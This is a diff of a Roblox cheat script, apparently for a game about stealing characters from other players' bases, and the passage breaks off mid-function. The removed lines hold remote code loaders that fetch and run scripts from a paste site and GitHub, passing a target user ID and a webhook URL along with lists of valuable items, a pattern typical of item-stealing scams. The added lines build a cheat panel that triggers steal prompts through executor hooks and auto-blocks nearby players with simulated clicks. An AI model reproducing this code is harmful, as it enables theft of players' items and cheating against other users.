-    ["Hydra Dragon Cannelloni"] = true,
-    ["John Pork"] = true,
-    ["Griffin"] = true,
-    ["Pancake and Syrup"] = true,
-    ["Elefanto Frigo"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Dragon Gingerini"] = true,
-    ["Globa Steppa"] = true,
-    ["Dragon Aquanini"] = true,
-    ["Arcadragon"] = true,
-    ["Dug Dug Dug"] = true,
-    ["Rubrikiko"] = true,
-    ["Hydra Bunny"] = true,
-    ["Antonio"] = true,
-    ["La Casa Boo"] = true,
-    ["La Supreme Combinasion"] = true,
-    ["Headless Horseman"] = true,
-    ["Signore Carapace"] = true,
-    ["Fishino Clownino"] = true,
-    ["Duggy Bros"] = true,
-    ["Foxini Lanternini"] = true,
-    ["Digi Narwhal"] = true,
-    ["Jelly Moby"] = true,
-    ["Moby Bros"] = true,
-    ["Gorillo Subwoofero"] = true,
-    ["Bearito Cabinito"] = true,
-    ["Centrucci Nuclucci"] = true,
-    ["Boppin Bunny"] = true,
-    ["Bunny and Eggy"] = true,
-    ["Fortunu and Cashuru"] = true,
-    ["Fragrama and Chocrama"] = true,
-    ["Garama and Madundung"] = true,
-    ["Gold Gold Gold"] = true,
-    ["Ginger Gerat"] = true,
-    ["Ketupat Bros"] = true,
-    ["La Secret Combinasion"] = true,
-    ["Burguro and Fryuro"] = true,
-    ["Gold and Diamond"] = true,
-    ["La Craft Machine"] = true,
-    ["Rico Dinero"] = true,
-    ["Kraken"] = true,
-    ["Cerberus"] = true,
-    ["Celestial Pegasus"] = true,
-    ["Capitano Moby"] = true,
-    ["Cash or Card"] = true,
-    ["Celularcini Viciosini"] = true,
-    ["Cooki and Milki"] = true,
-    ["Cloverat Clapat"] = true,
-    ["Fragola La La La"] = true,
-    ["Gobblino Uniciclino"] = true,
-    ["Jolly Jolly Sahur"] = true,
-    ["Hopilikalika Hopilikalako"] = true,
-    ["La Food Combinasion"] = true,
-    ["La Sahur Combinasion"] = true,
-    ["Los Secret Combinasionas"] = true,
-    ["Bumbatron"] = true,
-    ["S'more Serat"] = true,
-    ["La Grande Combinasion"] = true
-    ["Bandito Bobritto"] = true
+-- ===== CONFIG =====
+local STEAL_RADIUS     = 20
+local BLOCK_RADIUS     = 5
+local STEAL_DURATION   = 1.5
+local WAIT_DURATION    = 0.5
+local RESET_ANIMATION_ID = "71186871415348"
+local MIN_BLOCK_DELAY  = 0.05
+local PING_COMPENSATION = 0.10
+local HUB_VERSION      = "High"
+
+-- ===== STATE =====
+local isStealing         = false
+local activeThread       = 0
+local resetAnimationPlaying = false
+local currentCharacterId = 0
+local blockTriggered     = false
+local autoAdjust         = true
+local currentPing        = 0
+local blockEnabled       = true
+local whileHeldEnabled   = false
+local heldDown           = false
+local flashBlockBar      = 0
+
+-- ===== HELPERS =====
+local function getHRP()
+    local c = lp.Character
+    if c then
+        return c:FindFirstChild("HumanoidRootPart")
+            or c:FindFirstChild("UpperTorso")
+            or c:FindFirstChild("Torso")
+    end
+end
+
+local function isMyPlot(plot)
+    local sign = plot:FindFirstChild("PlotSign")
+    if not sign then return false end
+    local yb = sign:FindFirstChild("YourBase")
+    return yb and yb:IsA("BillboardGui") and yb.Enabled or false
+end
+
+local function findNearestPrompt()
+    if resetAnimationPlaying then return nil end
+    local hrp = getHRP()
+    if not hrp then return nil end
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then return nil end
+    local nearest, shortest = nil, math.huge
+    for _, plot in ipairs(plots:GetChildren()) do
+        if isMyPlot(plot) then continue end
+        local pods = plot:FindFirstChild("AnimalPodiums")
+        if not pods then continue end
+        for _, pod in ipairs(pods:GetChildren()) do
+            local base  = pod:FindFirstChild("Base")
+            local spawn = base and base:FindFirstChild("Spawn")
+            if not spawn then continue end
+            local dist = (spawn.Position - hrp.Position).Magnitude
+            if dist > STEAL_RADIUS or dist >= shortest then continue end
+            local attachment = spawn:FindFirstChild("PromptAttachment")
+            if not attachment then continue end
+            for _, prompt in ipairs(attachment:GetChildren()) do
+                if prompt:IsA("ProximityPrompt")
+                   and prompt.ActionText
+                   and prompt.ActionText:find("Steal") then
+                    nearest = prompt
+                    shortest = dist
+                end
+            end
+        end
+    end
+    return nearest
+end
+
+local function isWithinBlockRadius()
+    if resetAnimationPlaying then return false end
+    local hrp = getHRP()
+    if not hrp then return false end
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then return false end
+    for _, plot in ipairs(plots:GetChildren()) do
+        if isMyPlot(plot) then continue end
+        local pods = plot:FindFirstChild("AnimalPodiums")
+        if not pods then continue end
+        for _, pod in ipairs(pods:GetChildren()) do
+            local base  = pod:FindFirstChild("Base")
+            local spawn = base and base:FindFirstChild("Spawn")
+            if not spawn then continue end
+            if (spawn.Position - hrp.Position).Magnitude <= BLOCK_RADIUS then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function interval_getNearestPlayer()
+    local chr = lp and lp.Character
+    local hrp = chr and chr:FindFirstChild("HumanoidRootPart")
+    if not hrp then return nil end
+    local nearest, nearestDist = nil, math.huge
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= lp then
+            local c = p.Character
+            local h = c and c:FindFirstChild("HumanoidRootPart")
+            if h then
+                local dist = (h.Position - hrp.Position).Magnitude
+                if dist < nearestDist then
+                    nearestDist = dist
+                    nearest = p
+                end
+            end
+        end
+    end
+    return nearest
+end
+
+local function interval_blockPlayer(targetPlayer)
+    if not targetPlayer then return end
+    pcall(function() StarterGui:SetCore("PromptBlockPlayer", targetPlayer) end)
+    local cam = workspace.CurrentCamera
+    if not cam then return end
+    local vp = cam.ViewportSize
+    local x = math.floor(vp.X / 2) + math.random(-1, 1)
+    local y = math.floor(vp.Y / 2 + 50) + math.random(-1, 1)
+
+    local chr = lp and lp.Character
+    local blockers = {}
+    if chr then
+        for _, t in ipairs(chr:GetChildren()) do
+            if t:IsA("Tool") then
+                local blocked = true
+                local conn = t.Activated:Connect(function()
+                    if blocked then return end
+                end)
+                table.insert(blockers, {
+                    conn = conn,
+                    setUnblocked = function() blocked = false end
+                })
+            end
+        end
+    end
+
+    task.wait(0.04 + math.random() * 0.02)
+    pcall(function()
+        VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1)
+    end)
+    task.wait(0.008 + math.random() * 0.008)
+    pcall(function()
+        VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 1)
+    end)
+    task.delay(0.05, function()
+        for _, b in ipairs(blockers) do
+            b.setUnblocked()
+            pcall(function() b.conn:Disconnect() end)
+        end
+    end)
+end
+
+local function doBlock()
+    if not blockEnabled then return false end
+    local target = interval_getNearestPlayer()
+    if target then
+        pcall(interval_blockPlayer, target)
+        flashBlockBar = 1
+        return true
+    end
+    return false
+end
+
+local function getPromptConnections(prompt)
+    local hold, trigger = {}, {}
+    if getconnections then
+        for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
+            if c.Function then table.insert(hold, c.Function) end
+        end
+        for _, c in ipairs(getconnections(prompt.Triggered)) do
+            if c.Function then table.insert(trigger, c.Function) end
+        end
+    end
+    return hold, trigger
+end
+
+-- =========================================================
+-- ===== UI (visual estilo HighPvPScam + gear + minimize) ==
+-- =========================================================
+local oldGui = playerGui:FindFirstChild("HighVisualGui")
+if oldGui then oldGui:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "HighVisualGui"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 999
+gui.Parent = playerGui
+
+local function create(className, properties, parent)
+    local object = Instance.new(className)
+    for property, value in pairs(properties) do
+        object[property] = value
+    end
+    object.Parent = parent
+    return object
+end
+
+local function corner(parent, radius)
+    return create("UICorner", { CornerRadius = UDim.new(0, radius) }, parent)
+end
+
+local function stroke(parent, color, thickness, transparency)
+    return create("UIStroke", {
+        Color = color,
+        Thickness = thickness or 1,
+        Transparency = transparency or 0
+    }, parent)
+end
+
+-- Cores do tema High
+local colors = {
+    panel        = Color3.fromRGB(10, 15, 25),
+    panelTop     = Color3.fromRGB(14, 23, 37),
+    control      = Color3.fromRGB(24, 39, 61),
+    controlHover = Color3.fromRGB(31, 53, 82),
+    outline      = Color3.fromRGB(24, 83, 156),
+    white        = Color3.fromRGB(235, 244, 255),
+    muted        = Color3.fromRGB(156, 179, 204),
+    blue         = Color3.fromRGB(87, 177, 252),
+    blueHi       = Color3.fromRGB(154, 218, 255),
+    green        = Color3.fromRGB(98, 210, 137),
+    red          = Color3.fromRGB(220, 90, 90),
+    fill         = Color3.fromRGB(87, 177, 252),
+    fillIdle     = Color3.fromRGB(22, 34, 52),
+    trackOff     = Color3.fromRGB(22, 34, 52),
+    knobOn       = Color3.fromRGB(205, 241, 255),
+    knobOff      = Color3.fromRGB(62, 83, 112),
 }
 
-local TargetBaseSkins = {
-    
-}
-
-local TargetGears = {
-    ["Bloodmoon Hammer"] = true,
-    ["Candy Sentry"] = true,
-    ["Cupid's Wings"] = true,
-    ["Witch's Broom"] = true,
-    ["Santa's Sleigh"] = true,
-    ["Waverider"] = true,
-    ["Rainbow Hammer"] = true,
-    ["Rainbow Slap"] = true,
-    ["Lava Blaster"] = true
-}
+-- ===== BORDAS ANIMADAS (gradientes que rotacionam) =====
+local animatedGradients = {}
+local function attachAnimatedGradient(target, c1, c2, c3)
+    if not target then return nil end
+    local grad = Instance.new("UIGradient")
+    grad.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, c1 or colors.blueHi),
+        ColorSequenceKeypoint.new(0.5, c2 or colors.blue),
+        ColorSequenceKeypoint.new(1, c3 or colors.blueHi),
+    })
+    grad.Parent = target
+    table.insert(animatedGradients, grad)
+    return grad
+end
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
-end)
-
-task.spawn(function()
-    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
-    if type(script) == "function" then
-        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    while gui.Parent do
+        task.wait(0.03)
+        local rot = (tick() * 100) % 360
+        for _, g in ipairs(animatedGradients) do
+            if g and g.Parent then g.Rotation = rot end
+        end
     end
 end)
+
+-- ===== PAINEL PRINCIPAL =====
+local BASE_W = 445
+local BASE_H = 490
+
+local panel = create("Frame", {
+    Name = "HighPanel",
+    AnchorPoint = Vector2.new(0, 0.5),
+    Position = UDim2.new(0, 100, 0.5, 0),
+    Size = UDim2.new(0, BASE_W, 0, BASE_H),
+    BackgroundColor3 = colors.panel,
+    BackgroundTransparency = 0.05,
+    BorderSizePixel = 0,
+    ClipsDescendants = true,
+    Active = true,
+}, gui)
+corner(panel, 28)
+local mainStroke = stroke(panel, colors.blue, 1.5, 0.1)
+attachAnimatedGradient(mainStroke)
+
+-- UIScale para o slider
+local uiScale = Instance.new("UIScale")
+uiScale.Scale = 1
+uiScale.Parent = panel
+
+create("UIPadding", {
+    PaddingTop    = UDim.new(0, 20),
+    PaddingBottom = UDim.new(0, 20),
+    PaddingLeft   = UDim.new(0, 22),
+    PaddingRight  = UDim.new(0, 22)
+}, panel)
+
+-- ===== HEADER (arrastável) =====
+local headerFrame = create("Frame", {
+    Name = "HeaderFrame",
+    Size = UDim2.new(1, 0, 0, 55),
+    Position = UDim2.new(0, 0, 0, 0),
+    BackgroundTransparency = 1,
+    Active = true,
+    ZIndex = 2,
+}, panel)
+
+-- Título SEM animação de cor (estático)
+local titleLbl = create("TextLabel", {
+    Name = "Title",
+    Size = UDim2.new(1, -75, 0, 28),
+    BackgroundTransparency = 1,
+    Text = "High Bypass Protect",
+    TextColor3 = colors.white,
+    TextSize = 17,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 3,
+}, headerFrame)
+
+create("TextLabel", {
+    Name = "Subtitle",
+    Position = UDim2.new(0, 0, 0, 31),
+    Size = UDim2.new(1, -75, 0, 20),
+    BackgroundTransparency = 1,
+    Text = "High Hub on Top · " .. HUB_VERSION,
+    TextColor3 = colors.muted,
+    TextSize = 13,
+    Font = Enum.Font.Gotham,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 3,
+}, headerFrame)
+
+-- ===== BOTÃO GEAR (⚙) =====
+local gearBtn = create("TextButton", {
+    Name = "GearBtn",
+    AnchorPoint = Vector2.new(1, 0),
+    Position = UDim2.new(1, -2, 0, 2),
+    Size = UDim2.new(0, 26, 0, 26),
+    BackgroundColor3 = colors.control,
+    BackgroundTransparency = 0.2,
+    BorderSizePixel = 0,
+    Text = "⚙",
+    TextColor3 = colors.blueHi,
+    TextSize = 16,
+    Font = Enum.Font.GothamBold,
+    AutoButtonColor = false,
+    ZIndex = 4,
+}, headerFrame)
+corner(gearBtn, 8)
+local gearStroke = stroke(gearBtn, colors.blue, 1, 0.15)
+attachAnimatedGradient(gearStroke)
+
+-- ===== BOTÃO MINIMIZE (− / +) =====
+local minimizeBtn = create("TextButton", {
+    Name = "MinimizeBtn",
+    AnchorPoint = Vector2.new(1, 0),
+    Position = UDim2.new(1, -34, 0, 2),
+    Size = UDim2.new(0, 26, 0, 26),
+    BackgroundColor3 = colors.control,
+    BackgroundTransparency = 0.2,
+    BorderSizePixel = 0,
+    Text = "−",
+    TextColor3 = colors.white,
+    TextSize = 16,
+    Font = Enum.Font.GothamBold,
+    AutoButtonColor = false,
+    ZIndex = 4,
+}, headerFrame)
+corner(minimizeBtn, 8)
+local minStroke = stroke(minimizeBtn, colors.blue, 1, 0.15)
+attachAnimatedGradient(minStroke)
+
+-- ===== CONTENT TRACKER =====
+local contentElements = {}
+local function track(el)
+    if el then table.insert(contentElements, el) end
+    return el
+end
+
+-- ===== SECTION HEADER =====
+local function sectionHeader(y, text)
+    local wrap = track(create("Frame", {
+        Position = UDim2.new(0, 0, 0, y),
+        Size = UDim2.new(1, 0, 0, 18),
+        BackgroundTransparency = 1,
+        ZIndex = 3,
+    }, panel))
+    create("Frame", {
+        Size = UDim2.new(1, 0, 0, 1),
+        Position = UDim2.new(0, 0, 0.5, 0),
+        BackgroundColor3 = colors.outline,
+        BackgroundTransparency = 0.4,
+        BorderSizePixel = 0,
+    }, wrap)
+    local pill = create("Frame", {
+        AnchorPoint = Vector2.new(0.5, 0),
+        Position = UDim2.new(0.5, 0, 0, 0),
+        Size = UDim2.new(0, 0, 1, 0),
+        AutomaticSize = Enum.AutomaticSize.X,
+        BackgroundColor3 = colors.panelTop,
+        BorderSizePixel = 0,
+    }, wrap)
+    corner(pill, 5)
+    create("TextLabel", {
+        Size = UDim2.new(1, 10, 1, 0),
+        Position = UDim2.new(0, -5, 0, 0),
+        BackgroundTransparency = 1,
+        Text = text,
+        TextColor3 = colors.muted,
+        TextSize = 10,
+        Font = Enum.Font.GothamBold,
+    }, pill)
+    return wrap
+end
+
+-- STATUS
+local sectionY = 60
+sectionHeader(sectionY, " STATUS ")
+sectionY = sectionY + 22
+
+local nearest = track(create("TextLabel", {
+    Name = "Nearest",
+    Position = UDim2.new(0, 0, 0, sectionY),
+    Size = UDim2.new(1, 0, 0, 20),
+    BackgroundTransparency = 1,
+    Text = "Nearest: —",
+    TextColor3 = colors.muted,
+    TextSize = 14,
+    Font = Enum.Font.Gotham,
+    TextXAlignment = Enum.TextXAlignment.Left,
+}, panel))
+sectionY = sectionY + 24
+
+local ready = track(create("TextLabel", {
+    Name = "Status",
+    Position = UDim2.new(0, 0, 0, sectionY),
+    Size = UDim2.new(1, 0, 0, 20),
+    BackgroundTransparency = 1,
+    Text = "Ready — move near a steal prompt.",
+    TextColor3 = colors.muted,
+    TextSize = 13,
+    Font = Enum.Font.Gotham,
+    TextXAlignment = Enum.TextXAlignment.Left,
+}, panel))
+sectionY = sectionY + 30
+
+-- PROGRESS
+sectionHeader(sectionY, " PROGRESS ")
+sectionY = sectionY + 22
+
+local function addProgressRow(labelText, y)
+    local label = track(create("TextLabel", {
+        Position = UDim2.new(0, 0, 0, y),
+        Size = UDim2.new(1, 0, 0, 18),
+        BackgroundTransparency = 1,
+        Text = labelText,
+        TextColor3 = colors.muted,
+        TextSize = 12,
+        Font = Enum.Font.Gotham,
+        TextXAlignment = Enum.TextXAlignment.Left,
+    }, panel))
+
+    local bar = track(create("Frame", {
+        Position = UDim2.new(0, 0, 0, y + 22),
+        Size = UDim2.new(1, 0, 0, 12),
+        BackgroundColor3 = colors.trackOff,
+        BorderSizePixel = 0,
+        ClipsDescendants = true,
+    }, panel))
+    corner(bar, 6)
+    stroke(bar, colors.outline, 1, 0.4)
+
+    local fill = create("Frame", {
+        Name = "Fill",
+        Size = UDim2.new(0, 0, 1, 0),
+        BackgroundColor3 = colors.fillIdle,
+        BorderSizePixel = 0,
+    }, bar)
+    corner(fill, 6)
+
+    return label, bar, fill
+end
+
+local stealLabel, stealBar, stealFill = addProgressRow("Steal Progress", sectionY)
+sectionY = sectionY + 54
+local waitLabel,  waitBar,  waitFill  = addProgressRow("Wait", sectionY)
+sectionY = sectionY + 54
+local blockLabel, blockBar, blockFill = addProgressRow("Auto Block", sectionY)
+sectionY = sectionY + 62
+
+-- BOTÕES
+local function makeButton(name, text, position, size)
+    local button = create("TextButton", {
+        Name = name,
+        Position = position,
+        Size = size,
+        BackgroundColor3 = colors.control,
+        BorderSizePixel = 0,
+        AutoButtonColor = false,
+        Text = text,
+        TextColor3 = colors.white,
+        TextSize = 15,
+        Font = Enum.Font.GothamBold,
+        ZIndex = 4,
+    }, panel)
+    corner(button, 24)
+    local s = stroke(button, colors.blue, 1, 0.25)
+    attachAnimatedGradient(s)
+
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.15), { BackgroundColor3 = colors.controlHover }):Play()
+    end)
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.15), { BackgroundColor3 = colors.control }):Play()
+    end)
+    return button
+end
+
+local loadGrab = track(makeButton("LoadGrabButton", "Load Grab",
+    UDim2.new(0, 0, 0, sectionY), UDim2.new(0.68, -5, 0, 50)))
+
+local blockButton = track(makeButton("BlockButton", "Block: ON",
+    UDim2.new(0.68, 5, 0, sectionY), UDim2.new(0.32, -5, 0, 50)))
+
+local whileHeld = track(makeButton("WhileHeldButton", "While Held: OFF",
+    UDim2.new(0, 0, 0, sectionY + 58), UDim2.new(1, 0, 0, 46)))
+
+-- =========================================================
+-- ===== UI SIZE PANEL (aberto pelo gear) =================
+-- =========================================================
+local uiSizePanel = create("Frame", {
+    Name = "UISizePanel",
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    Size = UDim2.new(0, 260, 0, 110),
+    BackgroundColor3 = colors.panelTop,
+    BackgroundTransparency = 0.05,
+    BorderSizePixel = 0,
+    Visible = false,
+    Active = true,
+    ZIndex = 100,
+}, gui)
+corner(uiSizePanel, 14)
+local uiSizeStroke = stroke(uiSizePanel, colors.blue, 1.2, 0.1)
+attachAnimatedGradient(uiSizeStroke)
+
+create("TextLabel", {
+    Position = UDim2.new(0, 14, 0, 10),
+    Size = UDim2.new(1, -80, 0, 22),
+    BackgroundTransparency = 1,
+    Text = "UI Size",
+    TextColor3 = colors.white,
+    TextSize = 14,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 101,
+}, uiSizePanel)
+
+local sizePercentLbl = create("TextLabel", {
+    AnchorPoint = Vector2.new(1, 0),
+    Position = UDim2.new(1, -14, 0, 10),
+    Size = UDim2.new(0, 60, 0, 22),
+    BackgroundTransparency = 1,
+    Text = "100%",
+    TextColor3 = colors.blueHi,
+    TextSize = 13,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Right,
+    ZIndex = 101,
+}, uiSizePanel)
+
+-- Track do slider (com Active = true para receber input)
+local sliderTrack = create("Frame", {
+    Position = UDim2.new(0, 14, 0, 56),
+    Size = UDim2.new(1, -28, 0, 10),
+    BackgroundColor3 = colors.trackOff,
+    BorderSizePixel = 0,
+    Active = true,
+    ZIndex = 101,
+}, uiSizePanel)
+corner(sliderTrack, 5)
+
+local sliderFill = create("Frame", {
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundColor3 = colors.blue,
+    BorderSizePixel = 0,
+    ZIndex = 102,
+}, sliderTrack)
+corner(sliderFill, 5)
+attachAnimatedGradient(sliderFill, colors.blueHi, colors.blue, colors.blueHi)
+
+local sliderKnob = create("Frame", {
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(1, 0, 0.5, 0),
+    Size = UDim2.new(0, 16, 0, 16),
+    BackgroundColor3 = colors.knobOn,
+    BorderSizePixel = 0,
+    ZIndex = 103,
+}, sliderTrack)
+corner(sliderKnob, 8)
+create("UIStroke", { Color = colors.blue, Thickness = 1 }, sliderKnob)
+
+-- Hitbox transparente para pegar o input com folga
+local sliderHit = create("TextButton", {
+    Position = UDim2.new(0, -8, -1.5, 0),
+    Size = UDim2.new(1, 16, 4, 0),
+    BackgroundTransparency = 1,
+    Text = "",
+    AutoButtonColor = false,
+    ZIndex = 104,
+}, sliderTrack)
+
+local function setUIScale(pct)
+    pct = math.clamp(pct, 0, 1)
+    uiScale.Scale = pct
+    sizePercentLbl.Text = math.floor(pct * 100 + 0.5) .. "%"
+    sliderFill.Size = UDim2.new(pct, 0, 1, 0)
+    sliderKnob.Position = UDim2.new(pct, 0, 0.5, 0)
+end
+setUIScale(1)
+
+local draggingSlider = false
+local function updateSlider(input)
+    local absPos = sliderTrack.AbsolutePosition
+    local absSize = sliderTrack.AbsoluteSize
+    if absSize.X <= 0 then return end
+    setUIScale((input.Position.X - absPos.X) / absSize.X)
+end
+
+-- Conecta no hitbox (funciona para mouse e touch)
+sliderHit.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        draggingSlider = true
+        updateSlider(input)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch) then
+        updateSlider(input)
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        draggingSlider = false
+    end
+end)
+
+-- UI Size também arrastável pelo header dela
+local uiSizeHeader = create("TextButton", {
+    Position = UDim2.new(0, 0, 0, 0),
+    Size = UDim2.new(1, 0, 0, 40),
+    BackgroundTransparency = 1,
+    Text = "",
+    AutoButtonColor = false,
+    ZIndex = 99,
+}, uiSizePanel)
+do
+    local dragging, dragStart, startPos
+    uiSizeHeader.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = uiSizePanel.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+            or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            uiSizePanel.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+end
+
+-- Gear abre/fecha UI Size
+gearBtn.MouseButton1Click:Connect(function()
+    uiSizePanel.Visible = not uiSizePanel.Visible
+end)
+
+-- ===== MINIMIZE =====
+local minimized = false
+local function setMinimized(state)
+    minimized = state
+    for _, el in ipairs(contentElements) do
+        el.Visible = not state
+    end
+    if state then
+        panel.Size = UDim2.new(0, BASE_W, 0, 100)
+        minimizeBtn.Text = "+"
+    else
+        panel.Size = UDim2.new(0, BASE_W, 0, BASE_H)
+        minimizeBtn.Text = "−"
+    end
+end
+
+minimizeBtn.MouseButton1Click:Connect(function()
+    setMinimized(not minimized)
+end)
+
+-- ===== UI HELPERS =====
+local function setFill(fill, p)
+    if not fill then return end
+    fill.Size = UDim2.new(math.clamp(p, 0, 1), 0, 1, 0)
+end
+
+local function setStatus(text, color)
+    ready.Text = text
+    ready.TextColor3 = color or colors.muted
+end
+
+local function setNearest(text)
+    nearest.Text = text
+end
+
+-- ===== CHARACTER HOOK =====
+local function resetEverything()
+    activeThread = activeThread + 1
+    isStealing = false
+    blockTriggered = false
+    setFill(stealFill, 0)
+    setStatus("Ready — move near a steal prompt.", colors.muted)
+    local char = lp.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    if hum then hum:UnequipTools() end
+end
+
+local function hookCharacter(char)
+    currentCharacterId = currentCharacterId + 1
+    local myId = currentCharacterId
+    resetEverything()
+
+    local humanoid = char:WaitForChild("Humanoid", 5)
+    if not humanoid then return end
+
+    humanoid.Died:Connect(function()
+        if myId ~= currentCharacterId then return end
+        resetEverything()
+    end)
+
+    humanoid.AnimationPlayed:Connect(function(track)
+        if myId ~= currentCharacterId then return end
+        local anim = track.Animation
+        if not anim then return end
+        if tostring(anim.AnimationId):find(RESET_ANIMATION_ID) then
+            resetAnimationPlaying = true
+            resetEverything()
+            task.spawn(function()
+                while true do
+                    if myId ~= currentCharacterId then return end
+                    if not track.IsPlaying then break end
+                    task.wait()
+                end
+                if myId ~= currentCharacterId then return end
+                resetAnimationPlaying = false
+            end)
+        end
+    end)
+end
+
+if lp.Character then task.spawn(hookCharacter, lp.Character) end
+lp.CharacterAdded:Connect(function(char)
+    resetAnimationPlaying = false
+    resetEverything()
+    task.spawn(function()
+        char:WaitForChild("HumanoidRootPart", 10)
+        hookCharacter(char)
+    end)
+end)
+
+-- ===== STEAL LOGIC =====
+local function executeSteal(prompt)
+    if resetAnimationPlaying then return end
+    if isStealing then return end
+    if not prompt or not prompt.Parent then return end
+
+    local hold, trigger = getPromptConnections(prompt)
+    if #hold == 0 and #trigger == 0 then
+        setStatus("No connections on prompt.", colors.red)
+        return
+    end
+
+    isStealing = true
+    blockTriggered = false
+    activeThread = activeThread + 1
+    local myThread = activeThread
+    setStatus("Stealing...", colors.blue)
+
+    task.spawn(function()
+        if blockEnabled then task.spawn(doBlock) end
+
+        for _, f in ipairs(hold) do pcall(f) end
+
+        local startTime = os.clock()
+        while true do
+            if activeThread ~= myThread then return end
+            if resetAnimationPlaying then return end
+            local char = lp.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if not hum or hum.Health <= 0 then return end
+
+            local elapsed = os.clock() - startTime
+            if elapsed >= STEAL_DURATION then break end
+
+            local p = math.clamp(elapsed / STEAL_DURATION, 0, 1)
+            setFill(stealFill, p)
+
+            if not blockTriggered and isWithinBlockRadius() and blockEnabled then
+                blockTriggered = true
+                task.spawn(doBlock)
+            end
+
+            RunService.RenderStepped:Wait()
+        end
+
+        if activeThread ~= myThread then return end
+        if resetAnimationPlaying then return end
+
+        setFill(stealFill, 1)
+        for _, f in ipairs(trigger) do pcall(f) end
+
+        setStatus("Waiting...", colors.muted)
+        local waitStart = os.clock()
+        while true do
+            if activeThread ~= myThread then return end
+            local e = os.clock() - waitStart
+            if e >= WAIT_DURATION then break end
+            setFill(waitFill, e / WAIT_DURATION)
+            RunService.RenderStepped:Wait()
+        end
+
+        setFill(stealFill, 0)
+        setFill(waitFill, 0)
+        isStealing = false
+        blockTriggered = false
+        setStatus("Ready — move near a steal prompt.", colors.muted)
+    end)
+end
+
+-- ===== BOTÕES =====
+loadGrab.MouseButton1Down:Connect(function()
+    heldDown = true
+    if isStealing then
+        setStatus("Already stealing...", colors.muted)
+        return
+    end
+    local prompt = findNearestPrompt()
+    if prompt then
+        executeSteal(prompt)
+    else
+        setStatus("No prompt in range.", colors.red)
+        task.wait(1)
+        if not isStealing then
+            setStatus("Ready — move near a steal prompt.", colors.muted)
+        end
+    end
+end)
+
+loadGrab.MouseButton1Up:Connect(function()
+    heldDown = false
+end)
+
+-- BLOCK: sem cor vermelha ao desligar
+blockButton.MouseButton1Click:Connect(function()
+    blockEnabled = not blockEnabled
+    blockButton.Text = "Block: " .. (blockEnabled and "ON" or "OFF")
+end)
+
+whileHeld.MouseButton1Click:Connect(function()
+    whileHeldEnabled = not whileHeldEnabled
+    whileHeld.Text = "While Held: " .. (whileHeldEnabled and "ON" or "OFF")
+    whileHeld.BackgroundColor3 = whileHeldEnabled and colors.blue or colors.control
+end)
+
+-- ===== LOOP: While Held + Auto Block bar =====
+task.spawn(function()
+    while true do
+        task.wait(0.05)
+        if whileHeldEnabled and heldDown and blockEnabled then
+            doBlock()
+        end
+        if flashBlockBar > 0 then
+            flashBlockBar = math.max(0, flashBlockBar - 0.08)
+        end
+        setFill(blockFill, flashBlockBar)
+        if blockFill then
+            blockFill.BackgroundColor3 = flashBlockBar > 0
+                and colors.blue or colors.fillIdle
+        end
+    end
+end)
+
+-- ===== LOOP: Nearest player =====
+task.spawn(function()
+    while true do
+        task.wait(0.25)
+        local target = interval_getNearestPlayer()
+        if target then
+            setNearest("Nearest: " .. target.Name)
+        else
+            setNearest("Nearest: —")
+        end
+    end
+end)
+
+-- ===== LOOP: Ping =====
+task.spawn(function()
+    local function getPingValue()
+        local net = Stats:FindFirstChild("Network")
+        if net then
+            local p = net:FindFirstChild("Ping")
+            if p and typeof(p.Value) == "number" and p.Value > 0 then
+                return p.Value
+            end
+        end
+        if Stats.GetNetworkPing then
+            local ok, val = pcall(function() return Stats:GetNetworkPing() end)
+            if ok and val and val > 0 then return val * 1000 end
+        end
